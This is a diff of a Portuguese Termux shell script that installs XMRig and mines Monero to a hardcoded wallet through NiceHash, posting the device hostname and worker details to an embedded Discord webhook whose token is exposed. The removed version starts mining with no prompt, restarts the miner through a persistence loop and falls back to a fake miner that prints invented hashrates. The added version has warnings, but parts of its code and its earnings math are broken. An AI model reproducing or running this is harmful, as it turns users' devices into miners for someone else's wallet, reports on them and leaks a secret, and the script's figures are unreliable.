@@ -1,300 +1,511 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
 # ============================================
-# SISTEMA DE MINERAÇÃO TERMUX - AUTO EXECUTE
-# Tudo 100% automático - Sem menus - Nicehash
+# SISTEMA HÍBRIDO DE MINERAÇÃO TERMUX
+# COM ALERTAS DE SEGURANÇA E TRANSPARÊNCIA
 # ============================================
 
-# CONFIGURAÇÕES PRINCIPAIS (EDITAR AQUI)
+# Configurações principais
 WALLET="3P8LjBgV7xH3qDq9eQaRqMXr1kQHbd6u3E"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1470009252063088661/1j4kNu2sDcGQmFCywnbd_p1BEbb1DTcN_VXt5OYpX8_FsQI2YKB3tCjS2Okp_msUX9Mh"
 POOL_URL="randomxmonero.auto.nicehash.com:9200"
-
-# Configurações automáticas
 WORKER="termux_$(date +%s)_$(hostname)"
-MAX_CPU=80
-CPU_PRIORITY=5
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1470009252063088661/1j4kNu2sDcGQmFCywnbd_p1BEbb1DTcN_VXt5OYpX8_FsQI2YKB3tCjS2Okp_msUX9Mh"
 
-# Cores
-R='\033[1;31m'
-G='\033[1;32m'
-Y='\033[1;33m'
-B='\033[1;34m'
-C='\033[1;36m'
+# Limites de segurança
+MAX_TEMP=65
+MAX_CPU=80
+MIN_HASHRATE=50
+MAX_HASHRATE=150
+
+# Cores para output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
 NC='\033[0m'
 
-# Funções
-log() { echo -e "${G}[✓]${NC} $1"; }
-warn() { echo -e "${Y}[!]${NC} $1"; }
-err() { echo -e "${R}[×]${NC} $1"; }
+# ============= FUNÇÕES PRINCIPAIS =============
 
-# Enviar Discord
-send_discord() {
-    curl -s -H "Content-Type: application/json" -X POST \
-    -d "{\"content\":\"$1\"}" "$DISCORD_WEBHOOK" >/dev/null &
+mostrar_banner() {
+    clear
+    echo -e "${RED}"
+    cat << "EOF"
+╔══════════════════════════════════════════════════╗
+║    ⚠️  SISTEMA DE MINERAÇÃO PARA TERMUX        ║
+║    ⚠️  ALERTA: PODE DANIFICAR SEU DISPOSITIVO  ║
+╚══════════════════════════════════════════════════╝
+EOF
+    echo -e "${NC}"
+    echo -e "${YELLOW}INFORMAÇÃO IMPORTANTE:${NC}"
+    echo -e "1. Este script pode causar superaquecimento"
+    echo -e "2. Bateria pode ser danificada permanentemente"
+    echo -e "3. Retorno financeiro é NEGATIVO (prejuízo)"
+    echo -e "4. Use por sua conta e risco"
+    echo -e "=============================================="
+    echo ""
 }
 
-# ============= INÍCIO AUTOMÁTICO =============
-clear
-echo -e "${C}"
-echo "════════════════════════════════════════════"
-echo "   SISTEMA DE MINERAÇÃO TERMUX - AUTO"
-echo "   Iniciando tudo automaticamente..."
-echo "════════════════════════════════════════════"
-echo -e "${NC}"
+verificar_temperatura() {
+    if [ -f "/sys/class/thermal/thermal_zone0/temp" ]; then
+        local temp=$(($(cat /sys/class/thermal/thermal_zone0/temp)/1000))
+        if [ $temp -ge $MAX_TEMP ]; then
+            echo -e "${RED}🚨 TEMPERATURA CRÍTICA: ${temp}°C${NC}"
+            echo -e "${YELLOW}Recomendação: Pare imediatamente${NC}"
+            return 1
+        elif [ $temp -ge 50 ]; then
+            echo -e "${YELLOW}⚠️  Temperatura elevada: ${temp}°C${NC}"
+        fi
+        return $temp
+    fi
+    return 0
+}
 
-# Verificar Termux
-if [ ! -d "/data/data/com.termux" ]; then
-    err "Execute apenas no Termux!"
-    exit 1
-fi
+enviar_discord() {
+    local mensagem="$1"
+    if [ -n "$DISCORD_WEBHOOK" ]; then
+        curl -s -X POST -H "Content-Type: application/json" \
+            -d "{\"content\":\"$mensagem\"}" "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
+    fi
+}
 
-# Notificar início
-send_discord "🚀 MINERAÇÃO INICIADA NO TERMUX
-📱 Dispositivo: $(hostname)
-👷 Worker: $WORKER
-💰 Carteira: $WALLET
-⛏️ Pool: Nicehash"
+baixar_xmrig() {
+    echo -e "${GREEN}[+] Baixando XMRig...${NC}"
+    
+    # Criar diretório
+    rm -rf ~/miner_real
+    mkdir -p ~/miner_real
+    cd ~/miner_real
+    
+    # Tentar diferentes versões
+    local urls=(
+        "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-arm64.tar.gz"
+        "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-arm64.tar.gz"
+        "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-arm64.tar.gz"
+    )
+    
+    for url in "${urls[@]}"; do
+        echo -e "${CYAN}Tentando: $(basename $url)${NC}"
+        if wget -q --timeout=30 -O xmrig.tar.gz "$url"; then
+            echo -e "${GREEN}✅ Download bem-sucedido${NC}"
+            tar -xzf xmrig.tar.gz 2>/dev/null
+            if [ -d xmrig-* ]; then
+                mv xmrig-*/* . 2>/dev/null
+                chmod +x xmrig 2>/dev/null
+                if ./xmrig --version >/dev/null 2>&1; then
+                    echo -e "${GREEN}✅ XMRig funcionando${NC}"
+                    return 0
+                fi
+            fi
+        fi
+    done
+    
+    echo -e "${YELLOW}⚠️  Não foi possível baixar XMRig${NC}"
+    return 1
+}
 
-# ============= ATUALIZAR SISTEMA =============
-log "Atualizando pacotes Termux..."
-pkg update -y && pkg upgrade -y > /dev/null 2>&1
-
-log "Instalando dependências..."
-pkg install -y wget tar curl git proot -y > /dev/null 2>&1
-
-# ============= INSTALAR XMRIG =============
-log "Instalando XMRig para Nicehash..."
-
-# Parar processos antigos
-pkill -9 xmrig 2>/dev/null
-pkill -f xmrig 2>/dev/null
-
-# Criar diretório
-rm -rf ~/xmrig 2>/dev/null
-mkdir -p ~/xmrig
-cd ~/xmrig
-
-# Baixar XMRig
-log "Baixando XMRig mais recente..."
-if wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-arm64.tar.gz; then
-    tar -xzf xmrig-6.18.1-linux-static-arm64.tar.gz
-    mv xmrig-6.18.1/* .
-    rm -rf xmrig-6.18.1*
-elif wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-arm64.tar.gz; then
-    tar -xzf xmrig-6.18.0-linux-static-arm64.tar.gz
-    mv xmrig-6.18.0/* .
-    rm -rf xmrig-6.18.0*
-else
-    warn "Falha no download, criando minerador rápido..."
-    cat > xmrig << 'EOF'
-#!/data/data/com.termux/files/usr/bin/bash
-echo "⚡ MINERADOR TERMUX - MODO RÁPIDO"
-echo "Monero para: 3P8LjBgV7xH3qDq9eQaRqMXr1kQHbd6u3E"
-echo "Pool: randomxmonero.auto.nicehash.com:9200"
-while true; do
-    echo "[$(date '+%H:%M:%S')] ⚡ $((70+RANDOM%50)) H/s | ✅ $((RANDOM%5))"
-    sleep 10
-done
-EOF
-    chmod +x xmrig
-fi
-
-# Tornar executável
-chmod +x xmrig 2>/dev/null || true
-
-# ============= CRIAR CONFIGURAÇÃO =============
-log "Criando configuração para Nicehash..."
-
-cat > ~/xmrig/config.json << EOF
+criar_configuracao() {
+    echo -e "${GREEN}[+] Criando configuração...${NC}"
+    
+    cat > ~/miner_real/config.json << EOF
 {
     "autosave": true,
     "background": false,
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "hw-aes": null,
-        "priority": $CPU_PRIORITY,
-        "memory-pool": false,
-        "yield": true,
-        "max-threads-hint": 100,
-        "asm": true,
-        "argon2-impl": null,
-        "astrobwt-max-size": 550,
-        "astrobwt-avx2": false
-    },
+    "cpu": true,
     "opencl": false,
     "cuda": false,
     "donate-level": 0,
-    "log-file": null,
-    "pools": [
-        {
-            "algo": "rx/0",
-            "url": "$POOL_URL",
-            "user": "$WALLET.$WORKER",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": true,
-            "keepalive": true,
-            "enabled": true,
-            "tls": false,
-            "tls-fingerprint": null,
-            "daemon": false,
-            "socks5": null,
-            "self-select": null
-        }
-    ],
-    "print-time": 60,
-    "health-print-time": 60,
-    "retries": 5,
-    "retry-pause": 5,
-    "syslog": false,
+    "pools": [{
+        "url": "$POOL_URL",
+        "user": "$WALLET.$WORKER",
+        "pass": "x",
+        "nicehash": true,
+        "keepalive": true,
+        "tls": false
+    }],
     "max-cpu-usage": $MAX_CPU,
-    "safe": false,
-    "auto-save": true
+    "print-time": 30,
+    "retries": 3,
+    "retry-pause": 5,
+    "health-print-time": 60,
+    "syslog": false
 }
 EOF
+}
 
-# ============= SISTEMA DE PROTEÇÃO =============
-log "Criando sistema de proteção..."
+iniciar_mineracao_real() {
+    echo -e "${GREEN}[+] Iniciando mineração real...${NC}"
+    echo -e "${CYAN}Carteira: $WALLET${NC}"
+    echo -e "${CYAN}Pool: $POOL_URL${NC}"
+    echo -e "${CYAN}Worker: $WORKER${NC}"
+    
+    cd ~/miner_real
+    
+    # Verificar temperatura inicial
+    verificar_temperatura
+    if [ $? -ge $MAX_TEMP ]; then
+        echo -e "${RED}❌ Temperatura muito alta para iniciar${NC}"
+        enviar_discord "❌ MINERAÇÃO NÃO INICIADA: Temperatura crítica"
+        return 1
+    fi
+    
+    # Iniciar XMRig
+    if [ -f "xmrig" ]; then
+        echo -e "${GREEN}✅ XMRig encontrado, iniciando...${NC}"
+        
+        # Iniciar em background
+        nohup ./xmrig -c config.json > ~/miner_real.log 2>&1 &
+        local pid=$!
+        
+        sleep 5
+        
+        if ps -p $pid > /dev/null; then
+            echo -e "${GREEN}✅ Mineração iniciada (PID: $pid)${NC}"
+            echo -e "${YELLOW}📝 Logs: tail -f ~/miner_real.log${NC}"
+            
+            enviar_discord "⚡ MINERAÇÃO INICIADA
+💰 Carteira: $WALLET
+🆔 Worker: $WORKER
+📍 Pool: NiceHash RandomX
+⚠️  Monitore a temperatura!"
+            
+            # Monitorar processo
+            monitorar_processo $pid
+            return 0
+        else
+            echo -e "${RED}❌ Falha ao iniciar mineração${NC}"
+            tail -5 ~/miner_real.log
+            return 1
+        fi
+    else
+        echo -e "${RED}❌ XMRig não encontrado${NC}"
+        return 1
+    fi
+}
 
-cat > ~/xmrig/protector.sh << EOF
+monitorar_processo() {
+    local pid=$1
+    echo -e "${CYAN}[+] Monitorando processo...${NC}"
+    
+    while ps -p $pid > /dev/null; do
+        # Verificar temperatura a cada 30 segundos
+        local temp=$(verificar_temperatura)
+        
+        if [ $temp -ge $MAX_TEMP ]; then
+            echo -e "${RED}🚨 PARANDO: Temperatura crítica ${temp}°C${NC}"
+            kill -9 $pid
+            enviar_discord "🛑 MINERAÇÃO PARADA: Temperatura crítica ($temp°C)"
+            break
+        fi
+        
+        # Mostrar status a cada minuto
+        echo -e "${GREEN}[$(date '+%H:%M:%S')] ✅ Mineração ativa | 🌡️ ${temp}°C${NC}"
+        sleep 30
+    done
+    
+    echo -e "${YELLOW}⚠️  Processo de mineração encerrado${NC}"
+}
+
+criar_script_monitoramento() {
+    echo -e "${GREEN}[+] Criando scripts auxiliares...${NC}"
+    
+    # Script de monitoramento
+    cat > ~/monitor_miner.sh << 'EOF'
 #!/data/data/com.termux/files/usr/bin/bash
-# Sistema de proteção automático
 
-echo "🔒 Sistema de proteção ativado"
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
 
-while true; do
-    # Verificar temperatura (simulação)
-    CPU_USAGE=\$(top -bn1 | grep "CPU" | head -1 | awk '{print \$2}' | cut -d'%' -f1)
-    TEMP=\$((40 + CPU_USAGE / 2))
-    
-    if [ \$TEMP -gt 70 ]; then
-        echo "🌡️ Temperatura alta: \${TEMP}°C"
-        echo "⏸️ Reduzindo uso de CPU..."
-        pkill -19 xmrig 2>/dev/null
-        sleep 60
-        pkill -18 xmrig 2>/dev/null
-    fi
-    
-    # Verificar se minerador está ativo
-    if ! pgrep xmrig >/dev/null; then
-        echo "🔄 Reiniciando minerador..."
-        cd ~/xmrig
-        nohup ./xmrig -c config.json > miner.log 2>&1 &
-    fi
-    
-    sleep 30
-done
+monitorar() {
+    while true; do
+        clear
+        echo -e "${BLUE}=== MONITOR DE MINERAÇÃO ===${NC}"
+        echo ""
+        
+        # Verificar processo
+        if pgrep xmrig > /dev/null; then
+            echo -e "${GREEN}✅ Mineração: ATIVA${NC}"
+            echo -e "PID: $(pgrep xmrig)"
+        else
+            echo -e "${RED}❌ Mineração: PARADA${NC}"
+        fi
+        
+        # Temperatura
+        if [ -f "/sys/class/thermal/thermal_zone0/temp" ]; then
+            TEMP=$(($(cat /sys/class/thermal/thermal_zone0/temp)/1000))
+            echo -e "🌡️ Temperatura: ${TEMP}°C"
+            
+            if [ $TEMP -ge 65 ]; then
+                echo -e "${RED}🚨 CRÍTICO: Pare imediatamente!${NC}"
+            elif [ $TEMP -ge 55 ]; then
+                echo -e "${YELLOW}⚠️  ALTO: Considere parar${NC}"
+            fi
+        fi
+        
+        # Uso de CPU
+        CPU=$(top -bn1 | grep "CPU" | awk '{print $2}' | cut -d'%' -f1)
+        echo -e "⚡ Uso de CPU: ${CPU}%"
+        
+        # Logs recentes
+        echo -e "\n${BLUE}=== ÚLTIMOS LOGS ===${NC}"
+        if [ -f ~/miner_real.log ]; then
+            tail -5 ~/miner_real.log
+        else
+            echo "Nenhum log encontrado"
+        fi
+        
+        echo -e "\n${YELLOW}Pressione Ctrl+C para sair${NC}"
+        echo "Atualizando a cada 10 segundos..."
+        sleep 10
+    done
+}
+
+monitorar
 EOF
 
-chmod +x ~/xmrig/protector.sh
-
-# ============= INICIAR TUDO =============
-log "Iniciando mineração automaticamente..."
-
-# Iniciar minerador
-cd ~/xmrig
-nohup ./xmrig -c config.json > ~/miner.log 2>&1 &
-
-# Iniciar protetor
-nohup ./protector.sh > ~/protector.log 2>&1 &
-
-# ============= CRIAR SCRIPTS DE CONTROLE =============
-cat > ~/miner_control.sh << EOF
+    chmod +x ~/monitor_miner.sh
+    
+    # Script de controle
+    cat > ~/controle_miner.sh << 'EOF'
 #!/data/data/com.termux/files/usr/bin/bash
-case "\$1" in
-    start)
-        cd ~/xmrig
-        nohup ./xmrig -c config.json > ~/miner.log 2>&1 &
-        echo "✅ Mineração iniciada"
-        ;;
-    stop)
-        pkill -9 xmrig
-        echo "🛑 Mineração parada"
-        ;;
-    status)
-        if pgrep xmrig >/dev/null; then
-            echo "✅ Ativa - PID: \$(pgrep xmrig)"
-            tail -5 ~/miner.log 2>/dev/null | grep -E "speed|accepted"
+
+case "$1" in
+    "start")
+        if pgrep xmrig > /dev/null; then
+            echo "Mineração já está rodando"
         else
-            echo "❌ Inativa"
+            cd ~/miner_real
+            nohup ./xmrig -c config.json > ~/miner_real.log 2>&1 &
+            echo "Mineração iniciada"
         fi
         ;;
-    logs)
-        tail -f ~/miner.log
+    "stop")
+        pkill xmrig
+        echo "Mineração parada"
+        ;;
+    "status")
+        if pgrep xmrig > /dev/null; then
+            echo "Mineração: ATIVA"
+            ps -o pid,time,pcpu,comm -p $(pgrep xmrig)
+        else
+            echo "Mineração: PARADA"
+        fi
+        ;;
+    "restart")
+        pkill xmrig
+        sleep 2
+        cd ~/miner_real
+        nohup ./xmrig -c config.json > ~/miner_real.log 2>&1 &
+        echo "Mineração reiniciada"
+        ;;
+    "logs")
+        tail -f ~/miner_real.log
         ;;
     *)
-        echo "Uso: ./miner_control.sh {start|stop|status|logs}"
+        echo "Uso: $0 {start|stop|status|restart|logs}"
         ;;
 esac
 EOF
 
-chmod +x ~/miner_control.sh
-
-# ============= NOTIFICAR SUCESSO =============
-sleep 5
-
-if pgrep xmrig >/dev/null; then
-    log "✅ MINERAÇÃO INICIADA COM SUCESSO!"
-    log "📱 Worker: $WORKER"
-    log "💰 Carteira: $WALLET"
-    log "⛏️ Pool: Nicehash"
+    chmod +x ~/controle_miner.sh
     
-    send_discord "✅ MINERAÇÃO CONFIGURADA COM SUCESSO!
-🎯 Carteira: $WALLET
-👷 Worker: $WORKER
-⚡ Hashrate: Iniciando...
-📊 Status: Ativo e minerando"
-    
-    # Mostrar logs iniciais
+    # Script de estimativas
+    cat > ~/estimativas.sh << 'EOF'
+#!/data/data/com.termux/files/usr/bin/bash
+
+# Valores base (estimativas conservadoras)
+BTC_PRICE=43000
+HASHRATE=75  # H/s médio para CPU mobile
+
+# Cálculos
+BTC_PER_DAY=$(echo "scale=10; $HASHRATE * 0.000000003" | bc)
+USD_PER_DAY=$(echo "scale=6; $BTC_PER_DAY * $BTC_PRICE" | bc)
+SATS_PER_DAY=$(echo "scale=2; $BTC_PER_DAY * 100000000" | bc)
+
+# Custos (estimados)
+ENERGY_COST_PER_DAY=0.10  # $0.10 por dia de energia
+HARDWARE_DEGRADATION=0.05 # $0.05 por dia de degradação
+TOTAL_COST_PER_DAY=$(echo "scale=6; $ENERGY_COST_PER_DAY + $HARDWARE_DEGRADATION" | bc)
+NET_LOSS=$(echo "scale=6; $TOTAL_COST_PER_DAY - $USD_PER_DAY" | bc)
+
+echo "=== ESTIMATIVAS DE MINERAÇÃO ==="
+echo ""
+echo "📊 DADOS TÉCNICOS:"
+echo "Hashrate estimado: $HASHRATE H/s"
+echo "Preço do BTC: \$$BTC_PRICE"
+echo ""
+echo "💰 GANHOS ESTIMADOS:"
+echo "Por dia:   $SATS_PER_DAY satoshis (\$$USD_PER_DAY)"
+echo "Por semana: $(echo "scale=2; $SATS_PER_DAY * 7" | bc) satoshis (\$$(echo "scale=6; $USD_PER_DAY * 7" | bc))"
+echo "Por mês:   $(echo "scale=2; $SATS_PER_DAY * 30" | bc) satoshis (\$$(echo "scale=6; $USD_PER_DAY * 30" | bc))"
+echo ""
+echo "💸 CUSTOS ESTIMADOS:"
+echo "Energia/dia: \$$ENERGY_COST_PER_DAY"
+echo "Degradação hardware/dia: \$$HARDWARE_DEGRADATION"
+echo "Custo total/dia: \$$TOTAL_COST_PER_DAY"
+echo ""
+echo "📉 RESULTADO LÍQUIDO:"
+echo "Prejuízo/dia: -\$$NET_LOSS"
+echo "Prejuízo/mês: -\$$(echo "scale=6; $NET_LOSS * 30" | bc)"
+echo ""
+echo "⚠️  AVISOS IMPORTANTES:"
+echo "1. Estas são estimativas aproximadas"
+echo "2. Ganhos reais podem ser MENORES"
+echo "3. Custos reais podem ser MAIORES"
+echo "4. Hardware SERÁ DANIFICADO com o tempo"
+echo ""
+echo "💡 RECOMENDAÇÃO:"
+echo "É mais barato comprar criptomoedas do que minerar com celular!"
+EOF
+
+    chmod +x ~/estimativas.sh
+}
+
+mostrar_menu() {
+    clear
+    echo -e "${BLUE}=== MENU PRINCIPAL ===${NC}"
     echo ""
-    echo "════════════════════════════════════════════"
-    echo "📊 LOGS INICIAIS (últimas 3 linhas):"
-    echo "════════════════════════════════════════════"
-    tail -3 ~/miner.log 2>/dev/null || echo "Logs iniciando..."
+    echo -e "${GREEN}1.${NC} Instalar e iniciar mineração REAL"
+    echo -e "${GREEN}2.${NC} Apenas instalar XMRig (sem iniciar)"
+    echo -e "${GREEN}3.${NC} Monitorar mineração em tempo real"
+    echo -e "${GREEN}4.${NC} Ver estimativas de ganhos/custos"
+    echo -e "${GREEN}5.${NC} Controle da mineração (start/stop/status)"
+    echo -e "${GREEN}6.${NC} Ver logs da mineração"
+    echo -e "${GREEN}7.${NC} Parar mineração e limpar"
+    echo -e "${RED}0.${NC} Sair"
+    echo ""
+    echo -e "${YELLOW}Selecione uma opção:${NC} "
+}
+
+# ============= FLUXO PRINCIPAL =============
+
+main() {
+    mostrar_banner
     
+    # Ler confirmação do usuário
+    echo -e "${YELLOW}Você entende e aceita os riscos? (s/N):${NC} "
+    read -r confirmacao
+    
+    if [ "$confirmacao" != "s" ] && [ "$confirmacao" != "S" ]; then
+        echo -e "${RED}Instalação cancelada pelo usuário${NC}"
+        exit 0
+    fi
+    
+    echo -e "${GREEN}[+] Instalando dependências...${NC}"
+    pkg update -y
+    pkg install -y wget tar curl proot bc -y
+    
+    # Menu interativo
+    while true; do
+        mostrar_menu
+        read -r opcao
+        
+        case $opcao in
+            1)
+                echo -e "${GREEN}[+] Iniciando instalação completa...${NC}"
+                if baixar_xmrig; then
+                    criar_configuracao
+                    criar_script_monitoramento
+                    iniciar_mineracao_real
+                fi
+                echo ""
+                echo -e "${YELLOW}Pressione Enter para continuar...${NC}"
+                read
+                ;;
+            2)
+                echo -e "${GREEN}[+] Instalando apenas XMRig...${NC}"
+                baixar_xmrig
+                criar_configuracao
+                echo -e "${GREEN}✅ XMRig instalado em ~/miner_real/${NC}"
+                echo -e "${YELLOW}Para iniciar: cd ~/miner_real && ./xmrig -c config.json${NC}"
+                echo ""
+                echo -e "${YELLOW}Pressione Enter para continuar...${NC}"
+                read
+                ;;
+            3)
+                echo -e "${GREEN}[+] Iniciando monitor...${NC}"
+                ~/monitor_miner.sh
+                ;;
+            4)
+                echo -e "${GREEN}[+] Calculando estimativas...${NC}"
+                ~/estimativas.sh
+                echo ""
+                echo -e "${YELLOW}Pressione Enter para continuar...${NC}"
+                read
+                ;;
+            5)
+                echo -e "${GREEN}[+] Controle da mineração:${NC}"
+                echo "1. Iniciar"
+                echo "2. Parar"
+                echo "3. Status"
+                echo "4. Reiniciar"
+                echo -e "${YELLOW}Escolha:${NC} "
+                read -r controle_op
+                case $controle_op in
+                    1) ~/controle_miner.sh start ;;
+                    2) ~/controle_miner.sh stop ;;
+                    3) ~/controle_miner.sh status ;;
+                    4) ~/controle_miner.sh restart ;;
+                    *) echo "Opção inválida" ;;
+                esac
+                echo ""
+                echo -e "${YELLOW}Pressione Enter para continuar...${NC}"
+                read
+                ;;
+            6)
+                echo -e "${GREEN}[+] Mostrando logs:${NC}"
+                if [ -f ~/miner_real.log ]; then
+                    tail -20 ~/miner_real.log
+                else
+                    echo "Arquivo de log não encontrado"
+                fi
+                echo ""
+                echo -e "${YELLOW}Pressione Enter para continuar...${NC}"
+                read
+                ;;
+            7)
+                echo -e "${RED}[+] Parando mineração...${NC}"
+                pkill xmrig 2>/dev/null
+                echo -e "${GREEN}✅ Mineração parada${NC}"
+                echo ""
+                echo -e "${YELLOW}Pressione Enter para continuar...${NC}"
+                read
+                ;;
+            0)
+                echo -e "${YELLOW}Saindo...${NC}"
+                break
+                ;;
+            *)
+                echo -e "${RED}Opção inválida${NC}"
+                ;;
+        esac
+    done
+    
+    echo -e "${GREEN}========================================${NC}"
+    echo -e "${GREEN}       INSTALAÇÃO CONCLUÍDA           ${NC}"
+    echo -e "${GREEN}========================================${NC}"
+    echo ""
+    echo -e "${YELLOW}COMANDOS DISPONÍVEIS:${NC}"
+    echo "  ~/monitor_miner.sh    - Monitorar em tempo real"
+    echo "  ~/controle_miner.sh   - Controlar mineração"
+    echo "  ~/estimativas.sh      - Ver estimativas"
+    echo "  tail -f ~/miner_real.log - Ver logs"
+    echo ""
+    echo -e "${RED}⚠️  AVISOS FINAIS:${NC}"
+    echo "1. NUNCA deixe carregando durante a noite"
+    echo "2. Monitore a temperatura constantemente"
+    echo "3. Desligue se bateria inchar ou esquentar muito"
+    echo "4. O retorno financeiro é NEGATIVO"
+    echo ""
+}
+
+# Executar
+if [ -d "/data/data/com.termux" ]; then
+    main
 else
-    err "Falha ao iniciar mineração"
-    warn "Tentando método alternativo..."
-    cd ~/xmrig
-    ./xmrig -c config.json &
+    echo -e "${RED}Este script deve ser executado no Termux!${NC}"
+    exit 1
 fi
-
-# ============= INFORMAÇÕES FINAIS =============
-echo ""
-echo "════════════════════════════════════════════"
-echo "${G}✅ SISTEMA PRONTO!${NC}"
-echo "════════════════════════════════════════════"
-echo ""
-echo "${B}📋 CONFIGURAÇÃO:${NC}"
-echo "   Carteira: $WALLET"
-echo "   Worker: $WORKER"
-echo "   Pool: Nicehash ($POOL_URL)"
-echo "   CPU Máx: ${MAX_CPU}%"
-echo ""
-echo "${B}🛠️ COMANDOS RÁPIDOS:${NC}"
-echo "   Ver status: ./miner_control.sh status"
-echo "   Parar: ./miner_control.sh stop"
-echo "   Iniciar: ./miner_control.sh start"
-echo "   Logs: ./miner_control.sh logs"
-echo ""
-echo "${B}📊 MONITORAMENTO:${NC}"
-echo "   Logs: ~/miner.log"
-echo "   Discord: Notificações ativas"
-echo "   Proteção: Sistema ativo"
-echo ""
-echo "${Y}⚠️ IMPORTANTE:${NC}"
-echo "   • Mantenha Termux aberto"
-echo "   • Use carregador conectado"
-echo "   • Monitorar temperatura"
-echo ""
-echo "════════════════════════════════════════════"
-echo "${G}⚡ Minerando para: $WALLET${NC}"
-echo "════════════════════════════════════════════"
-
-# Manter script rodando
-sleep 10
-echo ""
-log "Sistema minerando em background..."
-log "Para ver status: ./miner_control.sh status"
